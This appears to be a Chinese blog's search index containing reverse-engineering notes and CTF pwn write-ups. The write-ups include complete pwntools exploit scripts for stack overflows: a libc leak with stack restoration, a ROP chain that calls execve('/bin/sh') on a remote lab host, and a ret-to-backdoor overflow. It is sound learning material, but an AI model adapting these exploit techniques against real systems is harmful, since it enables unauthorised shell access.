<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆向小知识总结</title>
      <link href="/2019/04/27/ni-xiang-xiao-zhi-shi-zong-jie/"/>
      <url>/2019/04/27/ni-xiang-xiao-zhi-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br>    <img src="/2019/04/27/ni-xiang-xiao-zhi-shi-zong-jie/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p><p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p><p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）<br>    1.GOTO 命令（Ctrl+G）然后 F4<br>    2.设置断点<br>    3.加上注释（快捷键 ; ）<br>    4.加上标签 （快捷键 : ）</p><p>快速查找指定代码的四种方法：<br>    1.代码执行法<br>    2.字符串检索法<br>    3.API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表<br>    3.API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API<br>函数调用约定：<br>    cdecl:<br>    调用者直接清理其压入栈的函数参数<br>    stdcall:<br>    一个使用例子</p><pre><code>#include &quot;stdio.h&quot;int _stdcall add(int a ,int b){    return a+b;}int main(){    return add(1,2);}这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）fastcall:与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特别讨厌的ecx-4</title>
      <link href="/2019/04/24/te-bie-tao-yan-de-ecx-4/"/>
      <url>/2019/04/24/te-bie-tao-yan-de-ecx-4/</url>
      
        <content type="html"><![CDATA[<p>ecx-4栈地址保护：先介绍一下这是什么鬼 。。。。。。我们正常栈转移的方式一般都是push ebp 和<br>leave ret 配合，但是这个题确使用的是用ecx来保存main函数的地址<br>main开始：<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/1.png" title="This is an image"><br>Main 结束:<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/2.png" title="This is an image"><br>这使得我们构造exp攻击的时候 必须考虑栈恢复（这才是这个题的主要考点）<br>首先在程序中的第一个读取位置：<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/3.png" title="This is an image"><br>Read函数直接从标准输入流读取数据，那么这就使得它不会自动加\0，这使得read函数可以一直往后读取0x40字节，<br>我第一从输入的时候输入了4个1进行调试，同时在这个read函数下方下断点<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/4.png" title="This is an image"><br>程序跑完后，gdb给我们反馈:<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/5.png" title="This is an image"><br>分析数据就得到这时ecx中存的我们的输入， 然后ebp中的值是上图的下面（对照寄存器中ebp的值和栈中的相应的值）<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/6.png" title="This is an image"><br>同时我们可以知道只要通过图中0xffffcfdc – 0xffffcfa0(输入的起始地址) = 0x3c ，即输入0x3c个字符就可以使得<br>栈中直到我们想要的ebp那块都没有\0，这样就可以泄露出ebp的值。<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/7.png" title="This is an image"><br>同时我们也得到了setbuf的地址那么根据这个就可以算出libc的基地址，<br>那么下面就是在构造payload的时候恢复栈，（因为上述的ecx-4，我们必须手动恢复栈，使得程序可以正常运行，否则程序崩溃）<br>那么在第三个read函数哪里，我们通过向第二个read函数输入一个负数，就可以构造出栈溢出：<br>那么我们先不让它栈溢出，通过调试看看ecx-4如何发挥作用：（我们在正常情况下栈恢复的命令哪里下断点）即0804873a，同时为了不形成栈溢出，我们只输入4个a<br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/9.png" title="This is an image"><br><img src="/2019/04/24/te-bie-tao-yan-de-ecx-4/8.png" title="This is an image"><br>然后我们根据输入aaaa在栈中的 地址可以得到它跟ebp之间的偏移是68,，同时因为ebp里面存的是我们要恢复的值（把ebp里面的值恢复成本来的），里面的值跟ebp的偏移可以算出来是24，同时我们可以看到main函数的返回地址跟输入的4个a之间的偏移是96，那么我们就可以把system的地址放在main函数的返回地址处。。。<br>那么，我们就得到了脚本。<br>from pwn import <em><br>elf = ELF(‘./xpwn’)<br>sh = process(‘./xpwn’)<br>libc = ELF(‘/lib/i386-linux-gnu/libc.so.6’)<br>context.log_level = “debug”<br>sh.recvuntil(‘Enter username: ‘)<br>sh.send(‘a’</em>60)<br>sh.recvuntil(‘a’<em>60)<br>setbuf_addr = sh.recv(4)<br>sh.recv(4</em>2)<br>main_ebp_addr = u32(sh.recv(4))<br>log.success(‘main_ebp_addr: ‘ + hex(main_ebp_addr))<br>libc_addr = u32(setbuf_addr) - libc.symbols[‘setbuf’]<br>log.success(‘libc_addr: ‘ + hex(libc_addr))<br>sh.recvuntil(‘Please set the length of password: ‘)<br>sh.sendline(‘-1’)<br>sh.recvuntil(‘): ‘)<br>system_addr = libc_addr + libc.symbols[‘system’]<br>log.success(‘system_addr: ‘ + hex(system_addr))<br>binsh_addr = libc_addr + libc.search(‘/bin/sh’).next()<br>log.success(‘binsh_addr: ‘ + hex(binsh_addr))<br>（恢复栈，避免崩溃）<br>sh.send(‘a’<em>(68)+p32(main_ebp_addr+24)+’a’</em>(96-68-4)+p32(system_addr)+p32(libc_addr+libc.symbols[‘exit’])+p32(binsh_addr)+p32(0))</p><p>sh.interactive()</p>]]></content>
      
      
      <categories>
          
          <category> PWM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过esp扩大栈空间</title>
      <link href="/2019/04/13/tong-guo-esp-kuo-da-zhan-kong-jian/"/>
      <url>/2019/04/13/tong-guo-esp-kuo-da-zhan-kong-jian/</url>
      
        <content type="html"><![CDATA[<p>声明：本博文资料来自i春秋（linux pwn入门教程），如有侵权可联系作者。<br>博主QQ：522796871<br>遇到一个修改esp扩大栈空间的题目跟大家分享一下：<br>程序使用静态编译+strip命令剥离符号（我也不知道这什么鬼意思，反正就是可以让程序看起来比较乱，不容易破解）看下图：<br><img src="/2019/04/13/tong-guo-esp-kuo-da-zhan-kong-jian/1.jpg" title="This is an image"><br>看，几乎程序中使用的函数名称都被隐藏了。以我现在的水平，通过对比syscall的eax值来确定函数是会把我累死的，那我就<br>IDA一键f5：<br><img src="/2019/04/13/tong-guo-esp-kuo-da-zhan-kong-jian/2.jpg" title="This is an image"><br>如果你进去verify函数，你就会发现它复杂的要死掉了，那我们就放弃静态分析，改用动态分析，输入大量字符测试得到有溢出，但是试着利用你就发现，根本利用不了（这也是这个题的特别之处），那我们ida动态调试得到，在verify函数中隐藏一个可以复制字符串的函数，明显为strcpy()（哎，大佬总是说明显，反正当时我看不出来），F8往下执行，发现有两个判断，输入的字符串前两位是否为py，（这个看出来应该不难吧）同时，原文中有：<br>通过观察数据我们很容易发现被修改的EIP是通过strncpy复制到输入前面的0x50个字节的最后8个（这个我之前从来没注意过，哎，是时候改抛弃无脑的GDB字符串测量了，因为你试了之后会发现，在这个题目里它没用）<br>OK,知道了上面的之后，我们可以开始构造rop了，下亮出代码（原文中的代码，我负责解释），一条条解释：<br>{<br>from pwn import <em><br>context.update(arch = ‘amd64’, os = ‘linux’, timeout = 1)<br>io = remote(‘172.17.0.3’, 10001)<br>payload = “”<br>payload += p64(0x6161616161617970)  #头两位为py，过检测<br>payload += ‘a’</em>0x40                 #padding<br>payload += p64(0x46f205)            #add esp, 0x58; ret<br>payload += ‘a’*8                    #padding<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_read设置参数<br>payload +=p64(0x8)                  #rdx = 8<br>payload += p64(0x6c7079)            #rsi = 0x6c7079<br>payload += p64(0x401823)            #pop rdi; ret 为sys_read设置参数<br>payload += p64(0x0)                 #rdi = 0<br>payload += p64(0x437ea9)            #mov rax, 0; syscall 调用sys_read<br>payload += p64(0x46f208)            #pop rax; ret<br>payload += p64(59)                  #rax = 0x3b<br>payload += p64(0x43ae29)            #pop rdx; pop rsi; ret 为sys_execve设置参数<br>payload += p64(0x0)                 #rdx = 0<br>payload += p64(0x0)                 #rsi = 0<br>payload += p64(0x401823)            #pop rdi; ret 为sys_execve设置参数<br>payload += p64(0x6c7079)            #rdi = 0x6c7079<br>payload += p64(0x437eae)            #syscall</p><p>print io.recv()<br>io.send(payload)<br>sleep(0.1)  #等待程序执行，防止出错</p><p>io.send(‘/bin/sh\x00’)<br>io.interactive()</p><p>}<br>注意，对esp的利用是的栈空间变为8位，对自己造的栈空间进行溢出攻击成功的运行了read函数，从而将sys_execve函数所需要使用的参数成功执行入寄存器，最终调用了sys_execve函数，不得不说，这是个十分精彩的rop链。<br>最后：我觉得这种exp的写法还是不用的好，逻辑关系看着困难<br>注：喜欢pwn的朋友可以加我QQ  一起讨论学习呀！</p>]]></content>
      
      
      <categories>
          
          <category> PWM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-栈溢出-无保护</title>
      <link href="/2019/04/06/linux-zhan-yi-chu-wu-bao-hu/"/>
      <url>/2019/04/06/linux-zhan-yi-chu-wu-bao-hu/</url>
      
        <content type="html"><![CDATA[<pre><code>首先我们先介绍一下栈溢出的基本原理：    栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变(下面我会用一个例题详细解释)。PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码）int __cdecl main(int argc, const char **argv, const char **envp)</code></pre><p>{<br>  char s; // [rsp+0h] [rbp-80h]</p><p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p><p>说明： 如果想要试试的话可以到我的github上下载题目 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shizhongpwn/pwnstudy.git</p>]]></content>
      
      
      <categories>
          
          <category> PWM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
